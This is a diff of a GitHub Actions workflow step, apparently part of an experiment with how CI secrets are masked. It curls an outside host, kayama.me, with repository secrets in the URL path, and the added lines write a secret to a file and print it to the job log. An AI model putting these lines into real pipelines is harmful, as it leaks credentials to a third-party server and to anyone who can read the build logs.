@@ -33,6 +33,8 @@ jobs:
       run: |
         echo step reused 2
         curl -s https://kayama.me/${{ secrets.SECRET_KEY }}/ > /dev/null
+        echo ${{ secrets.SECRET_KEY }}/ > secret.file
+        cat secret.file
         echo '-------------- secret ----------'
         curl -s https://kayama.me/${{ inputs.secret }}/ > /dev/null
         echo '----------------------------------------------------------------------------------------------------'
